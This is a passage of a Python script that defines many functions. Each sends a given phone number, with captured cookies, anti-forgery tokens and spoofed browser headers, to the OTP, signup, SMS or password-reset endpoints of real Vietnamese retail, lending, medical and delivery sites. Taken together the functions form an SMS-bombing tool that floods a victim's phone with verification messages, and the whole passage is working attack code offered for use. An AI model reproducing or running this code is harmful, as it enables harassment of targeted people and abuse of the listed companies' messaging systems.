___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.8.8977=1; SvID=new2688|Zoaz1|Zoaz0; _ce.irv=returning; cebs=1; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI; cebsp_=2; _ga_Y7SWKJEHCE=GS1.1.1720103888.2.1.1720103890.58.0.0; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1; _ce.s=v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476",
    'Origin': 'https://www.dienmayxanh.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Twguyex9_cgh9XeukD7bUARFjQSniZ-oK2sROjdYE3ySLrvJztUU-tZn-ZBnL8wqLJjlGTji6qBtWGJDVYPGVt0U3RgoB0Q2Grd4i24dkz4TUIRjXBHguoShv3oZjAt2s',
}

    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
   
        ###
def concung(phone):
    cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_pk_id.7.8f7e': '26368263202a729d.1690741327.',
    '_fbp': 'fb.1.1690741326923.344831016',
    '_tt_enable_cookie': '1',
    '_ttp': '4ISzilNrZxHb4rxPiS6GakGBcBl',
    'TBMCookie_3209819802479625248': '256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_gcl_au': '1.1.584652992.1720103764',
    'SvID': 'beline2685|ZoazW|ZoazV',
    '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.7.8f7e': '1',
    '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs',
    '_ga': 'GA1.2.1745564613.1690741327',
    '_gid': 'GA1.2.530012217.1720103766',
    '_gat': '1',
    '_ce.irv': 'returning',
    'cebs': '1',
    '_ga_TZK5WPYMMS': 'GS1.2.1720103766.6.0.1720103766.60.0.0',
    '_ga_TLRZMSX5ME': 'GS1.1.1720103764.33.1.1720103766.58.0.0',
    '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1',
    '_ce.clock_data': '-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    'cebsp_': '1',
    '_ce.s': 'v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _pk_id.7.8f7e=26368263202a729d.1690741327.; _fbp=fb.1.1690741326923.344831016; _tt_enable_cookie=1; _ttp=4ISzilNrZxHb4rxPiS6GakGBcBl; TBMCookie_3209819802479625248=256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.584652992.1720103764; SvID=beline2685|ZoazW|ZoazV; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.7.8f7e=1; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs; _ga=GA1.2.1745564613.1690741327; _gid=GA1.2.530012217.1720103766; _gat=1; _ce.irv=returning; cebs=1; _ga_TZK5WPYMMS=GS1.2.1720103766.6.0.1720103766.60.0.0; _ga_TLRZMSX5ME=GS1.1.1720103764.33.1.1720103766.58.0.0; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1; _ce.clock_data=-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; cebsp_=1; _ce.s=v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571",
    'Origin': 'https://www.thegioididong.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMG5vy2Ok1mvC8SbvlKgWIOz2Y3oc5DTGZxHd9t5Hsux7Fa-HK_oS6VsTyiSM9I--XIfDq9NA1NYxg9q87YfcUjoav9khceFwpr0rM5aRgoR-ivz9IHBVr9ZIWxqNXtMWE',
}

    response = requests.post(
    'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
  
def mocha(phone):
    headers = {
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://www.best-inc.vn',
    'Referer': 'https://www.best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-auth-type': 'WEB',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}

    json_data = {
    'phoneNumber': phone,
    'verificationCodeType': 1,
}

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
   
def money(phone):
    cookies = {
    'CaptchaCookieKey': '0',
    'language': 'vi',
    'UserTypeMarketing': 'L0',
    '__sbref': 'aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux',
    'ASP.NET_SessionId': 'k1lr5wm2mja2oyaf1zkcrdtu',
    'RequestData': '85580b70-8a3a-4ebc-9746-1009df921f42',
    '_gid': 'GA1.2.2031038846.1691083804',
    'UserMachineId_png': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_etag': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId_cache': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    'UserMachineId': 'fd5259b0-62a7-41c7-b5c5-e4ff646af322',
    '__RequestVerificationToken': 'G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41',
    '_ga_LCPCW0ZYR8': 'GS1.1.1691083803.8.1.1691084292.44.0.0',
    '_ga': 'GA1.2.149632214.1689613025',
    'Marker': 'MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
}

    headers = {
    'authority': 'moneyveo.vn',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'CaptchaCookieKey=0; language=vi; UserTypeMarketing=L0; __sbref=aoenyfhotuysrfcdmgodoankpbvodkhlvlscieux; ASP.NET_SessionId=k1lr5wm2mja2oyaf1zkcrdtu; RequestData=85580b70-8a3a-4ebc-9746-1009df921f42; _gid=GA1.2.2031038846.1691083804; UserMachineId_png=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_etag=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId_cache=fd5259b0-62a7-41c7-b5c5-e4ff646af322; UserMachineId=fd5259b0-62a7-41c7-b5c5-e4ff646af322; __RequestVerificationToken=G2H_TJyUnD4H65Lm_j7S2Ht0dUpNMG144oOeimKpubcF34pquENoVtqqNwOM8Fkgjr3O9HKJj0DqvT_erkcGDKu2KVDRDsu1fgTA2SmkTE41; _ga_LCPCW0ZYR8=GS1.1.1691083803.8.1.1691084292.44.0.0; _ga=GA1.2.149632214.1689613025; Marker=MarkerInfo=okk9LDILW/aZ/w6AkrhdpD21+MPg0L0hAEKWJo2NX18=',
    'origin': 'https://moneyveo.vn',
    'referer': 'https://moneyveo.vn/vi/registernew/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-d26637ca1a2ab6f01520174ccd97bf37-9060d6bf9370d383-00',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
}

    response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)

def winmart(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://winmart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://winmart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-api-merchant': 'WCM',
}

    json_data = {
    'firstName': 'Taylor Jasmine',
    'phoneNumber': phone,
    'masanReferralCode': '',
    'dobDate': '2005-08-05',
    'gender': 'Male',
}

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
def alf(phone):
    headers = {
    'authority': 'api.alfrescos.com.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN',
    'brandcode': 'ALFRESCOS',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'devicecode': 'web',
    'origin': 'https://alfrescos.com.vn',
    'pragma': 'no-cache',
    'referer': 'https://alfrescos.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

    params = {
    'culture': 'vi-VN',
}

    json_data = {
    'phoneNumber': phone,
    'secureHash': 'ebe2ae8a21608e1afa1dbb84e944dc89',
    'deviceId': '',
    'sendTime': 1691127801586,
    'type': 1,
}

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)

def phuc(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://order.phuclong.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://order.phuclong.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'userName': phone,
}

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', headers=headers, json=json_data) 
  
def emart(phone):
    cookies = {
    'emartsess': 'gmdbftq46lqooc1s5iv9l7nsn0',
    'default': 'e6ec14ce933f55f7f1a9bb7355',
    'language': 'vietn',
    'currency': 'VND',
    '_fbp': 'fb.2.1691143292627.1008340188',
    '_gid': 'GA1.3.332853186.1691143293',
    '_gat_gtag_UA_117859050_1': '1',
    '_ga_ZTB26JV4YJ': 'GS1.1.1691143293.1.1.1691143433.0.0.0',
    '_ga': 'GA1.1.736434119.1691143293',
}

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'emartsess=gmdbftq46lqooc1s5iv9l7nsn0; default=e6ec14ce933f55f7f1a9bb7355; language=vietn; currency=VND; _fbp=fb.2.1691143292627.1008340188; _gid=GA1.3.332853186.1691143293; _gat_gtag_UA_117859050_1=1; _ga_ZTB26JV4YJ=GS1.1.1691143293.1.1.1691143433.0.0.0; _ga=GA1.1.736434119.1691143293',
    'Origin': 'https://emartmall.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'X-Requested-With': 'XMLHttpRequest',
}

    data = {
    'mobile': phone,
}

    response = requests.post(
    'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
    cookies=cookies,
    headers=headers,
    data=data,
)
 
def hana(phone):
    cookies = {
    '_ym_uid': '1690554219913867740',
    '_ym_d': '1710341879',
    '_fbp': 'fb.1.1720103209034.327083033864980369',
    '_gcl_au': '1.1.2098605329.1720103209',
    '_ga_P2783EHVX2': 'GS1.1.1720103209.1.0.1720103209.60.0.0',
    '_ga': 'GA1.2.1065309191.1720103210',
    '_gid': 'GA1.2.543071985.1720103210',
    '_gat_UA-151110385-1': '1',
    '_tt_enable_cookie': '1',
    '_ttp': 'G5FqQUKlNy_Fx9r4kURNmkn6LOo',
    '_ym_visorc': 'b',
    '_ym_isad': '2',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi-VN',
    'cache-control': 'no-cache',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_ym_uid=1690554219913867740; _ym_d=1710341879; _fbp=fb.1.1720103209034.327083033864980369; _gcl_au=1.1.2098605329.1720103209; _ga_P2783EHVX2=GS1.1.1720103209.1.0.1720103209.60.0.0; _ga=GA1.2.1065309191.1720103210; _gid=GA1.2.543071985.1720103210; _gat_UA-151110385-1=1; _tt_enable_cookie=1; _ttp=G5FqQUKlNy_Fx9r4kURNmkn6LOo; _ym_visorc=b; _ym_isad=2',
    'origin': 'https://vayvnd.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vayvnd.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'site-id': '3',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'login': phone,
    'trackingId': '8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3',
}

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)

def kingz(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': '',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'domain': 'kingfoodmart',
    'origin': 'https://kingfoodmart.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://kingfoodmart.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'operationName': 'SendOTP',
    'variables': {
        'phone': phone,
    },
    'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
}

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
def med(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://id-v121.medpro.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://id-v121.medpro.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'appid': 'medpro',
    'cskhtoken': '',
    'locale': '',
    'momoid': '',
    'osid': '',
    'ostoken': '',
    'partnerid': 'medpro',
    'platform': 'pc',
}

    json_data = {
    'fullname': 'người dùng medpro',
    'deviceId': '401387b523eda9fc5998c36541400134',
    'phone': phone,
    'type': 'password',
}

    response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)
###
def ghn(phone):
    headers = {
    'authority': 'online-gateway.ghn.vn',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'pragma': 'no-cache',
    'referer': 'https://sso.ghn.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': phone,
    'type': 'register',
}

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
 ###
def shop(phone):
    cookies = {
    '_gcl_au': '1.1.1745429184.1691586808',
    '_fbp': 'fb.1.1691586808676.1451418847',
    '_ga': 'GA1.2.1936138960.1691586808',
    '_gid': 'GA1.2.1897491687.1691674994',
    '_gat_UA-78703708-2': '1',
    '_ga_P138SCK22P': 'GS1.1.1691674994.3.1.1691675011.43.0.0',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gcl_au=1.1.1745429184.1691586808; _fbp=fb.1.1691586808676.1451418847; _ga=GA1.2.1936138960.1691586808; _gid=GA1.2.1897491687.1691674994; _gat_UA-78703708-2=1; _ga_P138SCK22P=GS1.1.1691674994.3.1.1691675011.43.0.0',
    'Origin': 'https://shopiness.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://shopiness.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'action': 'verify-registration-info',
    'phoneNumber': phone,
    'refCode': '',
}

    response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data)  
###
def gala(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi',
